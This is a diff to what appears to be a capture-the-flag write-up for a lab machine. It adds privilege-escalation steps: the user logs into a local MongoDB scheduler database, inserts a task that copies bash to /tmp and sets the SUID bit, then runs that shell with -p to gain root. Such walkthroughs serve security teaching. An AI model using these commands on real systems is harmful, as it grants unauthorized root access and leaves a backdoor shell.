@@ -49,3 +49,22 @@ Notice the `const url` towards the top which contains a mongodb connection strin
 ```sh
 $ ssh 10.10.10.58 -l mark
 ```
+
+...
+
+```sh
+# COnnect to local mongo scheduler db
+$ mongo -p -u mark scheduler
+
+# Insert a new task to copy bash and SUID it
+> db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/lsec; /bin/chmod u+s /tmp/lsec"});
+
+# See if task is still pending
+> db.tasks.find()
+
+# Exit mongodb
+> Ctrl-D
+
+# Execute the SUID bash shell using the -p flag
+# /tmp/lsec -p
+```
